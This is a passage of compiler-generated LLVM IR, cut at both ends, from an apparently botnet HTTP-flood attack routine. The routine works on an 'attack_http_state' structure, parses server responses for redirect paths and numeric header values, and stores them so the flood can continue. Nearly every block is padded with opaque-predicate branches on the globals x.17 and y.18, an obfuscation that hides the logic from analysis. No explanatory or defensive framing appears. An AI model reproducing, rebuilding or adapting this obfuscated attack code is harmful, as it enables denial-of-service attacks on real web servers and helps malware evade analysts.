  %2468 = call i32 @util_memsearch(i8* %2466, i32 %2467, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %2469 = icmp eq i32 %2468, 4
  br i1 %2469, label %2470, label %2576

; <label>:2470:                                   ; preds = %2458
  store i32 7, i32* %10, align 4
  %2471 = load i8*, i8** %54, align 8
  %2472 = getelementptr inbounds i8, i8* %2471, i64 4
  %2473 = load i8, i8* %2472, align 1
  %2474 = sext i8 %2473 to i32
  %2475 = icmp eq i32 %2474, 115
  br i1 %2475, label %2476, label %2495

; <label>:2476:                                   ; preds = %2470
  %2477 = load i32, i32* @x.17
  %2478 = load i32, i32* @y.18
  %2479 = sub i32 %2477, 1
  %2480 = mul i32 %2477, %2479
  %2481 = urem i32 %2480, 2
  %2482 = icmp eq i32 %2481, 0
  %2483 = icmp slt i32 %2478, 10
  %2484 = or i1 %2482, %2483
  br i1 %2484, label %originalBB361, label %originalBB361alteredBB

originalBB361:                                    ; preds = %originalBB361alteredBB, %2476
  %2485 = load i32, i32* %10, align 4
  %2486 = add nsw i32 %2485, 1
  store i32 %2486, i32* %10, align 4
  %2487 = load i32, i32* @x.17
  %2488 = load i32, i32* @y.18
  %2489 = sub i32 %2487, 1
  %2490 = mul i32 %2487, %2489
  %2491 = urem i32 %2490, 2
  %2492 = icmp eq i32 %2491, 0
  %2493 = icmp slt i32 %2488, 10
  %2494 = or i1 %2492, %2493
  br i1 %2494, label %originalBBpart2367, label %originalBB361alteredBB

originalBBpart2367:                               ; preds = %originalBB361
  br label %2495

; <label>:2495:                                   ; preds = %originalBBpart2367, %2470
  %2496 = load i8*, i8** %54, align 8
  %2497 = load i8*, i8** %54, align 8
  %2498 = load i32, i32* %10, align 4
  %2499 = sext i32 %2498 to i64
  %2500 = getelementptr inbounds i8, i8* %2497, i64 %2499
  %2501 = load i32, i32* %53, align 4
  %2502 = load i32, i32* %10, align 4
  %2503 = sub nsw i32 %2501, %2502
  %2504 = sext i32 %2503 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2496, i8* %2500, i64 %2504, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %2505

; <label>:2505:                                   ; preds = %2526, %2495
  %2506 = load i8*, i8** %54, align 8
  %2507 = load i32, i32* %10, align 4
  %2508 = sext i32 %2507 to i64
  %2509 = getelementptr inbounds i8, i8* %2506, i64 %2508
  %2510 = load i8, i8* %2509, align 1
  %2511 = sext i8 %2510 to i32
  %2512 = icmp ne i32 %2511, 0
  br i1 %2512, label %2513, label %2529

; <label>:2513:                                   ; preds = %2505
  %2514 = load i8*, i8** %54, align 8
  %2515 = load i32, i32* %10, align 4
  %2516 = sext i32 %2515 to i64
  %2517 = getelementptr inbounds i8, i8* %2514, i64 %2516
  %2518 = load i8, i8* %2517, align 1
  %2519 = sext i8 %2518 to i32
  %2520 = icmp eq i32 %2519, 47
  br i1 %2520, label %2521, label %2526

; <label>:2521:                                   ; preds = %2513
  %2522 = load i8*, i8** %54, align 8
  %2523 = load i32, i32* %10, align 4
  %2524 = sext i32 %2523 to i64
  %2525 = getelementptr inbounds i8, i8* %2522, i64 %2524
  store i8 0, i8* %2525, align 1
  br label %2529

; <label>:2526:                                   ; preds = %2513
  %2527 = load i32, i32* %10, align 4
  %2528 = add nsw i32 %2527, 1
  store i32 %2528, i32* %10, align 4
  br label %2505

; <label>:2529:                                   ; preds = %2521, %2505
  %2530 = load i8*, i8** %54, align 8
  %2531 = call i32 @util_strlen(i8* %2530)
  %2532 = icmp sgt i32 %2531, 0
  br i1 %2532, label %2533, label %2543

; <label>:2533:                                   ; preds = %2529
  %2534 = load i8*, i8** %54, align 8
  %2535 = call i32 @util_strlen(i8* %2534)
  %2536 = icmp slt i32 %2535, 128
  br i1 %2536, label %2537, label %2543

; <label>:2537:                                   ; preds = %2533
  %2538 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2539 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2538, i32 0, i32 7
  %2540 = getelementptr inbounds [129 x i8], [129 x i8]* %2539, i32 0, i32 0
  %2541 = load i8*, i8** %54, align 8
  %2542 = call i32 @util_strcpy(i8* %2540, i8* %2541)
  br label %2543

; <label>:2543:                                   ; preds = %2537, %2533, %2529
  %2544 = load i8*, i8** %54, align 8
  %2545 = load i32, i32* %10, align 4
  %2546 = add nsw i32 %2545, 1
  %2547 = sext i32 %2546 to i64
  %2548 = getelementptr inbounds i8, i8* %2544, i64 %2547
  %2549 = call i32 @util_strlen(i8* %2548)
  %2550 = icmp slt i32 %2549, 256
  br i1 %2550, label %2551, label %2575

; <label>:2551:                                   ; preds = %2543
  %2552 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2553 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2552, i32 0, i32 6
  %2554 = getelementptr inbounds [257 x i8], [257 x i8]* %2553, i32 0, i32 0
  %2555 = getelementptr inbounds i8, i8* %2554, i64 1
  call void @util_zero(i8* %2555, i32 255)
  %2556 = load i8*, i8** %54, align 8
  %2557 = load i32, i32* %10, align 4
  %2558 = add nsw i32 %2557, 1
  %2559 = sext i32 %2558 to i64
  %2560 = getelementptr inbounds i8, i8* %2556, i64 %2559
  %2561 = call i32 @util_strlen(i8* %2560)
  %2562 = icmp sgt i32 %2561, 0
  br i1 %2562, label %2563, label %2574

; <label>:2563:                                   ; preds = %2551
  %2564 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2565 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2564, i32 0, i32 6
  %2566 = getelementptr inbounds [257 x i8], [257 x i8]* %2565, i32 0, i32 0
  %2567 = getelementptr inbounds i8, i8* %2566, i64 1
  %2568 = load i8*, i8** %54, align 8
  %2569 = load i32, i32* %10, align 4
  %2570 = add nsw i32 %2569, 1
  %2571 = sext i32 %2570 to i64
  %2572 = getelementptr inbounds i8, i8* %2568, i64 %2571
  %2573 = call i32 @util_strcpy(i8* %2567, i8* %2572)
  br label %2574

; <label>:2574:                                   ; preds = %2563, %2551
  br label %2575

; <label>:2575:                                   ; preds = %2574, %2543
  br label %2647

; <label>:2576:                                   ; preds = %2458
  %2577 = load i8*, i8** %54, align 8
  %2578 = getelementptr inbounds i8, i8* %2577, i64 0
  %2579 = load i8, i8* %2578, align 1
  %2580 = sext i8 %2579 to i32
  %2581 = icmp eq i32 %2580, 47
  br i1 %2581, label %2582, label %2630

; <label>:2582:                                   ; preds = %2576
  %2583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2583, i32 0, i32 6
  %2585 = getelementptr inbounds [257 x i8], [257 x i8]* %2584, i32 0, i32 0
  %2586 = getelementptr inbounds i8, i8* %2585, i64 1
  call void @util_zero(i8* %2586, i32 255)
  %2587 = load i8*, i8** %54, align 8
  %2588 = load i32, i32* %10, align 4
  %2589 = add nsw i32 %2588, 1
  %2590 = sext i32 %2589 to i64
  %2591 = getelementptr inbounds i8, i8* %2587, i64 %2590
  %2592 = call i32 @util_strlen(i8* %2591)
  %2593 = icmp sgt i32 %2592, 0
  br i1 %2593, label %2594, label %2629

; <label>:2594:                                   ; preds = %2582
  %2595 = load i32, i32* @x.17
  %2596 = load i32, i32* @y.18
  %2597 = sub i32 %2595, 1
  %2598 = mul i32 %2595, %2597
  %2599 = urem i32 %2598, 2
  %2600 = icmp eq i32 %2599, 0
  %2601 = icmp slt i32 %2596, 10
  %2602 = or i1 %2600, %2601
  br i1 %2602, label %originalBB369, label %originalBB369alteredBB

originalBB369:                                    ; preds = %originalBB369alteredBB, %2594
  %2603 = load i8*, i8** %54, align 8
  %2604 = load i32, i32* %10, align 4
  %2605 = add nsw i32 %2604, 1
  %2606 = sext i32 %2605 to i64
  %2607 = getelementptr inbounds i8, i8* %2603, i64 %2606
  %2608 = call i32 @util_strlen(i8* %2607)
  %2609 = icmp slt i32 %2608, 256
  %2610 = load i32, i32* @x.17
  %2611 = load i32, i32* @y.18
  %2612 = sub i32 %2610, 1
  %2613 = mul i32 %2610, %2612
  %2614 = urem i32 %2613, 2
  %2615 = icmp eq i32 %2614, 0
  %2616 = icmp slt i32 %2611, 10
  %2617 = or i1 %2615, %2616
  br i1 %2617, label %originalBBpart2378, label %originalBB369alteredBB

originalBBpart2378:                               ; preds = %originalBB369
  br i1 %2609, label %2618, label %2629

; <label>:2618:                                   ; preds = %originalBBpart2378
  %2619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2619, i32 0, i32 6
  %2621 = getelementptr inbounds [257 x i8], [257 x i8]* %2620, i32 0, i32 0
  %2622 = getelementptr inbounds i8, i8* %2621, i64 1
  %2623 = load i8*, i8** %54, align 8
  %2624 = load i32, i32* %10, align 4
  %2625 = add nsw i32 %2624, 1
  %2626 = sext i32 %2625 to i64
  %2627 = getelementptr inbounds i8, i8* %2623, i64 %2626
  %2628 = call i32 @util_strcpy(i8* %2622, i8* %2627)
  br label %2629

; <label>:2629:                                   ; preds = %2618, %originalBBpart2378, %2582
  br label %2630

; <label>:2630:                                   ; preds = %2629, %2576
  %2631 = load i32, i32* @x.17
  %2632 = load i32, i32* @y.18
  %2633 = sub i32 %2631, 1
  %2634 = mul i32 %2631, %2633
  %2635 = urem i32 %2634, 2
  %2636 = icmp eq i32 %2635, 0
  %2637 = icmp slt i32 %2632, 10
  %2638 = or i1 %2636, %2637
  br i1 %2638, label %originalBB380, label %originalBB380alteredBB

originalBB380:                                    ; preds = %originalBB380alteredBB, %2630
  %2639 = load i32, i32* @x.17
  %2640 = load i32, i32* @y.18
  %2641 = sub i32 %2639, 1
  %2642 = mul i32 %2639, %2641
  %2643 = urem i32 %2642, 2
  %2644 = icmp eq i32 %2643, 0
  %2645 = icmp slt i32 %2640, 10
  %2646 = or i1 %2644, %2645
  br i1 %2646, label %originalBBpart2382, label %originalBB380alteredBB

originalBBpart2382:                               ; preds = %originalBB380
  br label %2647

; <label>:2647:                                   ; preds = %originalBBpart2382, %2575
  %2648 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2648, i32 0, i32 1
  store i8 1, i8* %2649, align 4
  br label %4233

; <label>:2650:                                   ; preds = %2438
  %2651 = load i32, i32* @x.17
  %2652 = load i32, i32* @y.18
  %2653 = sub i32 %2651, 1
  %2654 = mul i32 %2651, %2653
  %2655 = urem i32 %2654, 2
  %2656 = icmp eq i32 %2655, 0
  %2657 = icmp slt i32 %2652, 10
  %2658 = or i1 %2656, %2657
  br i1 %2658, label %originalBB384, label %originalBB384alteredBB

originalBB384:                                    ; preds = %originalBB384alteredBB, %2650
  %2659 = load i32, i32* @x.17
  %2660 = load i32, i32* @y.18
  %2661 = sub i32 %2659, 1
  %2662 = mul i32 %2659, %2661
  %2663 = urem i32 %2662, 2
  %2664 = icmp eq i32 %2663, 0
  %2665 = icmp slt i32 %2660, 10
  %2666 = or i1 %2664, %2665
  br i1 %2666, label %originalBBpart2386, label %originalBB384alteredBB

originalBBpart2386:                               ; preds = %originalBB384
  br label %2667

; <label>:2667:                                   ; preds = %originalBBpart2386, %2402
  %2668 = load i32, i32* @x.17
  %2669 = load i32, i32* @y.18
  %2670 = sub i32 %2668, 1
  %2671 = mul i32 %2668, %2670
  %2672 = urem i32 %2671, 2
  %2673 = icmp eq i32 %2672, 0
  %2674 = icmp slt i32 %2669, 10
  %2675 = or i1 %2673, %2674
  br i1 %2675, label %originalBB388, label %originalBB388alteredBB

originalBB388:                                    ; preds = %originalBB388alteredBB, %2667
  %2676 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2677 = load i32, i32* %12, align 4
  %2678 = call i8* @table_retrieve_val(i32 44, i32* null)
  %2679 = call i32 @util_stristr(i8* %2676, i32 %2677, i8* %2678)
  %2680 = icmp ne i32 %2679, -1
  %2681 = load i32, i32* @x.17
  %2682 = load i32, i32* @y.18
  %2683 = sub i32 %2681, 1
  %2684 = mul i32 %2681, %2683
  %2685 = urem i32 %2684, 2
  %2686 = icmp eq i32 %2685, 0
  %2687 = icmp slt i32 %2682, 10
  %2688 = or i1 %2686, %2687
  br i1 %2688, label %originalBBpart2390, label %originalBB388alteredBB

originalBBpart2390:                               ; preds = %originalBB388
  br i1 %2680, label %2689, label %3355

; <label>:2689:                                   ; preds = %originalBBpart2390
  %2690 = load i32, i32* @x.17
  %2691 = load i32, i32* @y.18
  %2692 = sub i32 %2690, 1
  %2693 = mul i32 %2690, %2692
  %2694 = urem i32 %2693, 2
  %2695 = icmp eq i32 %2694, 0
  %2696 = icmp slt i32 %2691, 10
  %2697 = or i1 %2695, %2696
  br i1 %2697, label %originalBB392, label %originalBB392alteredBB

originalBB392:                                    ; preds = %originalBB392alteredBB, %2689
  %2698 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2699 = load i32, i32* %12, align 4
  %2700 = call i8* @table_retrieve_val(i32 44, i32* null)
  %2701 = call i32 @util_stristr(i8* %2698, i32 %2699, i8* %2700)
  store i32 %2701, i32* %55, align 4
  %2702 = load i32, i32* %55, align 4
  %2703 = sext i32 %2702 to i64
  %2704 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2703
  %2705 = load i8, i8* %2704, align 1
  %2706 = sext i8 %2705 to i32
  %2707 = icmp eq i32 %2706, 32
  %2708 = load i32, i32* @x.17
  %2709 = load i32, i32* @y.18
  %2710 = sub i32 %2708, 1
  %2711 = mul i32 %2708, %2710
  %2712 = urem i32 %2711, 2
  %2713 = icmp eq i32 %2712, 0
  %2714 = icmp slt i32 %2709, 10
  %2715 = or i1 %2713, %2714
  br i1 %2715, label %originalBBpart2394, label %originalBB392alteredBB

originalBBpart2394:                               ; preds = %originalBB392
  br i1 %2707, label %2716, label %2735

; <label>:2716:                                   ; preds = %originalBBpart2394
  %2717 = load i32, i32* @x.17
  %2718 = load i32, i32* @y.18
  %2719 = sub i32 %2717, 1
  %2720 = mul i32 %2717, %2719
  %2721 = urem i32 %2720, 2
  %2722 = icmp eq i32 %2721, 0
  %2723 = icmp slt i32 %2718, 10
  %2724 = or i1 %2722, %2723
  br i1 %2724, label %originalBB396, label %originalBB396alteredBB

originalBB396:                                    ; preds = %originalBB396alteredBB, %2716
  %2725 = load i32, i32* %55, align 4
  %2726 = add nsw i32 %2725, 1
  store i32 %2726, i32* %55, align 4
  %2727 = load i32, i32* @x.17
  %2728 = load i32, i32* @y.18
  %2729 = sub i32 %2727, 1
  %2730 = mul i32 %2727, %2729
  %2731 = urem i32 %2730, 2
  %2732 = icmp eq i32 %2731, 0
  %2733 = icmp slt i32 %2728, 10
  %2734 = or i1 %2732, %2733
  br i1 %2734, label %originalBBpart2398, label %originalBB396alteredBB

originalBBpart2398:                               ; preds = %originalBB396
  br label %2735

; <label>:2735:                                   ; preds = %originalBBpart2398, %originalBBpart2394
  %2736 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2737 = load i32, i32* %55, align 4
  %2738 = sext i32 %2737 to i64
  %2739 = getelementptr inbounds i8, i8* %2736, i64 %2738
  %2740 = load i32, i32* %12, align 4
  %2741 = load i32, i32* %55, align 4
  %2742 = sub nsw i32 %2740, %2741
  %2743 = call i32 @util_memsearch(i8* %2739, i32 %2742, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2743, i32* %56, align 4
  %2744 = load i32, i32* %56, align 4
  %2745 = icmp ne i32 %2744, -1
  br i1 %2745, label %2746, label %3354

; <label>:2746:                                   ; preds = %2735
  %2747 = load i32, i32* %55, align 4
  %2748 = sext i32 %2747 to i64
  %2749 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2748
  store i8* %2749, i8** %57, align 8
  %2750 = load i32, i32* %56, align 4
  %2751 = icmp sge i32 %2750, 2
  br i1 %2751, label %2752, label %2771

; <label>:2752:                                   ; preds = %2746
  %2753 = load i32, i32* @x.17
  %2754 = load i32, i32* @y.18
  %2755 = sub i32 %2753, 1
  %2756 = mul i32 %2753, %2755
  %2757 = urem i32 %2756, 2
  %2758 = icmp eq i32 %2757, 0
  %2759 = icmp slt i32 %2754, 10
  %2760 = or i1 %2758, %2759
  br i1 %2760, label %originalBB400, label %originalBB400alteredBB

originalBB400:                                    ; preds = %originalBB400alteredBB, %2752
  %2761 = load i32, i32* %56, align 4
  %2762 = sub nsw i32 %2761, 2
  store i32 %2762, i32* %56, align 4
  %2763 = load i32, i32* @x.17
  %2764 = load i32, i32* @y.18
  %2765 = sub i32 %2763, 1
  %2766 = mul i32 %2763, %2765
  %2767 = urem i32 %2766, 2
  %2768 = icmp eq i32 %2767, 0
  %2769 = icmp slt i32 %2764, 10
  %2770 = or i1 %2768, %2769
  br i1 %2770, label %originalBBpart2404, label %originalBB400alteredBB

originalBBpart2404:                               ; preds = %originalBB400
  br label %2771

; <label>:2771:                                   ; preds = %originalBBpart2404, %2746
  %2772 = load i32, i32* %55, align 4
  %2773 = load i32, i32* %56, align 4
  %2774 = add nsw i32 %2772, %2773
  %2775 = sext i32 %2774 to i64
  %2776 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2775
  store i8 0, i8* %2776, align 1
  %2777 = load i32, i32* %56, align 4
  %2778 = add nsw i32 %2777, 1
  store i32 %2778, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %2779

; <label>:2779:                                   ; preds = %originalBBpart2424, %2771
  %2780 = load i8*, i8** %57, align 8
  %2781 = load i32, i32* %10, align 4
  %2782 = sext i32 %2781 to i64
  %2783 = getelementptr inbounds i8, i8* %2780, i64 %2782
  %2784 = load i8, i8* %2783, align 1
  %2785 = sext i8 %2784 to i32
  %2786 = icmp ne i32 %2785, 0
  br i1 %2786, label %2787, label %2803

; <label>:2787:                                   ; preds = %2779
  %2788 = load i8*, i8** %57, align 8
  %2789 = load i32, i32* %10, align 4
  %2790 = sext i32 %2789 to i64
  %2791 = getelementptr inbounds i8, i8* %2788, i64 %2790
  %2792 = load i8, i8* %2791, align 1
  %2793 = sext i8 %2792 to i32
  %2794 = icmp sge i32 %2793, 48
  br i1 %2794, label %2795, label %2803

; <label>:2795:                                   ; preds = %2787
  %2796 = load i8*, i8** %57, align 8
  %2797 = load i32, i32* %10, align 4
  %2798 = sext i32 %2797 to i64
  %2799 = getelementptr inbounds i8, i8* %2796, i64 %2798
  %2800 = load i8, i8* %2799, align 1
  %2801 = sext i8 %2800 to i32
  %2802 = icmp sle i32 %2801, 57
  br label %2803

; <label>:2803:                                   ; preds = %2795, %2787, %2779
  %2804 = phi i1 [ false, %2787 ], [ false, %2779 ], [ %2802, %2795 ]
  %2805 = load i32, i32* @x.17
  %2806 = load i32, i32* @y.18
  %2807 = sub i32 %2805, 1
  %2808 = mul i32 %2805, %2807
  %2809 = urem i32 %2808, 2
  %2810 = icmp eq i32 %2809, 0
  %2811 = icmp slt i32 %2806, 10
  %2812 = or i1 %2810, %2811
  br i1 %2812, label %originalBB406, label %originalBB406alteredBB

originalBB406:                                    ; preds = %originalBB406alteredBB, %2803
  %2813 = load i32, i32* @x.17
  %2814 = load i32, i32* @y.18
  %2815 = sub i32 %2813, 1
  %2816 = mul i32 %2813, %2815
  %2817 = urem i32 %2816, 2
  %2818 = icmp eq i32 %2817, 0
  %2819 = icmp slt i32 %2814, 10
  %2820 = or i1 %2818, %2819
  br i1 %2820, label %originalBBpart2408, label %originalBB406alteredBB

originalBBpart2408:                               ; preds = %originalBB406
  br i1 %2804, label %2821, label %2840

; <label>:2821:                                   ; preds = %originalBBpart2408
  %2822 = load i32, i32* @x.17
  %2823 = load i32, i32* @y.18
  %2824 = sub i32 %2822, 1
  %2825 = mul i32 %2822, %2824
  %2826 = urem i32 %2825, 2
  %2827 = icmp eq i32 %2826, 0
  %2828 = icmp slt i32 %2823, 10
  %2829 = or i1 %2827, %2828
  br i1 %2829, label %originalBB410, label %originalBB410alteredBB

originalBB410:                                    ; preds = %originalBB410alteredBB, %2821
  %2830 = load i32, i32* %10, align 4
  %2831 = add nsw i32 %2830, 1
  store i32 %2831, i32* %10, align 4
  %2832 = load i32, i32* @x.17
  %2833 = load i32, i32* @y.18
  %2834 = sub i32 %2832, 1
  %2835 = mul i32 %2832, %2834
  %2836 = urem i32 %2835, 2
  %2837 = icmp eq i32 %2836, 0
  %2838 = icmp slt i32 %2833, 10
  %2839 = or i1 %2837, %2838
  br i1 %2839, label %originalBBpart2424, label %originalBB410alteredBB

originalBBpart2424:                               ; preds = %originalBB410
  br label %2779

; <label>:2840:                                   ; preds = %originalBBpart2408
  %2841 = load i32, i32* @x.17
  %2842 = load i32, i32* @y.18
  %2843 = sub i32 %2841, 1
  %2844 = mul i32 %2841, %2843
  %2845 = urem i32 %2844, 2
  %2846 = icmp eq i32 %2845, 0
  %2847 = icmp slt i32 %2842, 10
  %2848 = or i1 %2846, %2847
  br i1 %2848, label %originalBB426, label %originalBB426alteredBB

originalBB426:                                    ; preds = %originalBB426alteredBB, %2840
  %2849 = load i8*, i8** %57, align 8
  %2850 = load i32, i32* %10, align 4
  %2851 = sext i32 %2850 to i64
  %2852 = getelementptr inbounds i8, i8* %2849, i64 %2851
  %2853 = load i8, i8* %2852, align 1
  %2854 = sext i8 %2853 to i32
  %2855 = icmp ne i32 %2854, 0
  %2856 = load i32, i32* @x.17
  %2857 = load i32, i32* @y.18
  %2858 = sub i32 %2856, 1
  %2859 = mul i32 %2856, %2858
  %2860 = urem i32 %2859, 2
  %2861 = icmp eq i32 %2860, 0
  %2862 = icmp slt i32 %2857, 10
  %2863 = or i1 %2861, %2862
  br i1 %2863, label %originalBBpart2428, label %originalBB426alteredBB

originalBBpart2428:                               ; preds = %originalBB426
  br i1 %2855, label %2864, label %3337

; <label>:2864:                                   ; preds = %originalBBpart2428
  %2865 = load i32, i32* @x.17
  %2866 = load i32, i32* @y.18
  %2867 = sub i32 %2865, 1
  %2868 = mul i32 %2865, %2867
  %2869 = urem i32 %2868, 2
  %2870 = icmp eq i32 %2869, 0
  %2871 = icmp slt i32 %2866, 10
  %2872 = or i1 %2870, %2871
  br i1 %2872, label %originalBB430, label %originalBB430alteredBB

originalBB430:                                    ; preds = %originalBB430alteredBB, %2864
  store i32 0, i32* %58, align 4
  %2873 = load i8*, i8** %57, align 8
  %2874 = load i32, i32* %10, align 4
  %2875 = sext i32 %2874 to i64
  %2876 = getelementptr inbounds i8, i8* %2873, i64 %2875
  store i8 0, i8* %2876, align 1
  %2877 = load i32, i32* %10, align 4
  %2878 = add nsw i32 %2877, 1
  store i32 %2878, i32* %10, align 4
  %2879 = load i8*, i8** %57, align 8
  %2880 = load i32, i32* %10, align 4
  %2881 = sext i32 %2880 to i64
  %2882 = getelementptr inbounds i8, i8* %2879, i64 %2881
  %2883 = load i8, i8* %2882, align 1
  %2884 = sext i8 %2883 to i32
  %2885 = icmp eq i32 %2884, 32
  %2886 = load i32, i32* @x.17
  %2887 = load i32, i32* @y.18
  %2888 = sub i32 %2886, 1
  %2889 = mul i32 %2886, %2888
  %2890 = urem i32 %2889, 2
  %2891 = icmp eq i32 %2890, 0
  %2892 = icmp slt i32 %2887, 10
  %2893 = or i1 %2891, %2892
  br i1 %2893, label %originalBBpart2436, label %originalBB430alteredBB

originalBBpart2436:                               ; preds = %originalBB430
  br i1 %2885, label %2894, label %2913

; <label>:2894:                                   ; preds = %originalBBpart2436
  %2895 = load i32, i32* @x.17
  %2896 = load i32, i32* @y.18
  %2897 = sub i32 %2895, 1
  %2898 = mul i32 %2895, %2897
  %2899 = urem i32 %2898, 2
  %2900 = icmp eq i32 %2899, 0
  %2901 = icmp slt i32 %2896, 10
  %2902 = or i1 %2900, %2901
  br i1 %2902, label %originalBB438, label %originalBB438alteredBB

originalBB438:                                    ; preds = %originalBB438alteredBB, %2894
  %2903 = load i32, i32* %10, align 4
  %2904 = add nsw i32 %2903, 1
  store i32 %2904, i32* %10, align 4
  %2905 = load i32, i32* @x.17
  %2906 = load i32, i32* @y.18
  %2907 = sub i32 %2905, 1
  %2908 = mul i32 %2905, %2907
  %2909 = urem i32 %2908, 2
  %2910 = icmp eq i32 %2909, 0
  %2911 = icmp slt i32 %2906, 10
  %2912 = or i1 %2910, %2911
  br i1 %2912, label %originalBBpart2449, label %originalBB438alteredBB

originalBBpart2449:                               ; preds = %originalBB438
  br label %2913

; <label>:2913:                                   ; preds = %originalBBpart2449, %originalBBpart2436
  %2914 = load i8*, i8** %57, align 8
  %2915 = load i32, i32* %10, align 4
  %2916 = sext i32 %2915 to i64
  %2917 = getelementptr inbounds i8, i8* %2914, i64 %2916
  %2918 = load i8*, i8** %57, align 8
  %2919 = load i32, i32* %10, align 4
  %2920 = sext i32 %2919 to i64
  %2921 = getelementptr inbounds i8, i8* %2918, i64 %2920
  %2922 = call i32 @util_strlen(i8* %2921)
  %2923 = call i32 @util_stristr(i8* %2917, i32 %2922, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2924 = icmp ne i32 %2923, -1
  br i1 %2924, label %2925, label %2954

; <label>:2925:                                   ; preds = %2913
  %2926 = load i32, i32* @x.17
  %2927 = load i32, i32* @y.18
  %2928 = sub i32 %2926, 1
  %2929 = mul i32 %2926, %2928
  %2930 = urem i32 %2929, 2
  %2931 = icmp eq i32 %2930, 0
  %2932 = icmp slt i32 %2927, 10
  %2933 = or i1 %2931, %2932
  br i1 %2933, label %originalBB451, label %originalBB451alteredBB

originalBB451:                                    ; preds = %originalBB451alteredBB, %2925
  %2934 = load i8*, i8** %57, align 8
  %2935 = load i32, i32* %10, align 4
  %2936 = sext i32 %2935 to i64
  %2937 = getelementptr inbounds i8, i8* %2934, i64 %2936
  %2938 = load i8*, i8** %57, align 8
  %2939 = load i32, i32* %10, align 4
  %2940 = sext i32 %2939 to i64
  %2941 = getelementptr inbounds i8, i8* %2938, i64 %2940
  %2942 = call i32 @util_strlen(i8* %2941)
  %2943 = call i32 @util_stristr(i8* %2937, i32 %2942, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %2944 = load i32, i32* %10, align 4
  %2945 = add nsw i32 %2944, %2943
  store i32 %2945, i32* %10, align 4
  %2946 = load i32, i32* @x.17
  %2947 = load i32, i32* @y.18
  %2948 = sub i32 %2946, 1
  %2949 = mul i32 %2946, %2948
  %2950 = urem i32 %2949, 2
  %2951 = icmp eq i32 %2950, 0
  %2952 = icmp slt i32 %2947, 10
  %2953 = or i1 %2951, %2952
  br i1 %2953, label %originalBBpart2463, label %originalBB451alteredBB

originalBBpart2463:                               ; preds = %originalBB451
  br label %2954

; <label>:2954:                                   ; preds = %originalBBpart2463, %2913
  %2955 = load i8*, i8** %57, align 8
  %2956 = load i32, i32* %10, align 4
  %2957 = sext i32 %2956 to i64
  %2958 = getelementptr inbounds i8, i8* %2955, i64 %2957
  %2959 = load i8, i8* %2958, align 1
  %2960 = sext i8 %2959 to i32
  %2961 = icmp eq i32 %2960, 34
  br i1 %2961, label %2962, label %2994

; <label>:2962:                                   ; preds = %2954
  %2963 = load i32, i32* %10, align 4
  %2964 = add nsw i32 %2963, 1
  store i32 %2964, i32* %10, align 4
  %2965 = load i8*, i8** %57, align 8
  %2966 = load i32, i32* %10, align 4
  %2967 = sext i32 %2966 to i64
  %2968 = getelementptr inbounds i8, i8* %2965, i64 %2967
  %2969 = load i8*, i8** %57, align 8
  %2970 = load i32, i32* %10, align 4
  %2971 = sext i32 %2970 to i64
  %2972 = getelementptr inbounds i8, i8* %2969, i64 %2971
  %2973 = call i32 @util_strlen(i8* %2972)
  %2974 = sub nsw i32 %2973, 1
  %2975 = sext i32 %2974 to i64
  %2976 = getelementptr inbounds i8, i8* %2968, i64 %2975
  %2977 = load i8, i8* %2976, align 1
  %2978 = sext i8 %2977 to i32
  %2979 = icmp eq i32 %2978, 34
  br i1 %2979, label %2980, label %2993

; <label>:2980:                                   ; preds = %2962
  %2981 = load i8*, i8** %57, align 8
  %2982 = load i32, i32* %10, align 4
  %2983 = sext i32 %2982 to i64
  %2984 = getelementptr inbounds i8, i8* %2981, i64 %2983
  %2985 = load i8*, i8** %57, align 8
  %2986 = load i32, i32* %10, align 4
  %2987 = sext i32 %2986 to i64
  %2988 = getelementptr inbounds i8, i8* %2985, i64 %2987
  %2989 = call i32 @util_strlen(i8* %2988)
  %2990 = sub nsw i32 %2989, 1
  %2991 = sext i32 %2990 to i64
  %2992 = getelementptr inbounds i8, i8* %2984, i64 %2991
  store i8 0, i8* %2992, align 1
  br label %2993

; <label>:2993:                                   ; preds = %2980, %2962
  br label %2994

; <label>:2994:                                   ; preds = %2993, %2954
  %2995 = load i8*, i8** %57, align 8
  %2996 = call i32 @util_atoi(i8* %2995, i32 10)
  store i32 %2996, i32* %58, align 4
  br label %2997

; <label>:2997:                                   ; preds = %3028, %2994
  %2998 = load i32, i32* %58, align 4
  %2999 = icmp sgt i32 %2998, 0
  br i1 %2999, label %3000, label %3026

; <label>:3000:                                   ; preds = %2997
  %3001 = load i32, i32* @x.17
  %3002 = load i32, i32* @y.18
  %3003 = sub i32 %3001, 1
  %3004 = mul i32 %3001, %3003
  %3005 = urem i32 %3004, 2
  %3006 = icmp eq i32 %3005, 0
  %3007 = icmp slt i32 %3002, 10
  %3008 = or i1 %3006, %3007
  br i1 %3008, label %originalBB465, label %originalBB465alteredBB

originalBB465:                                    ; preds = %originalBB465alteredBB, %3000
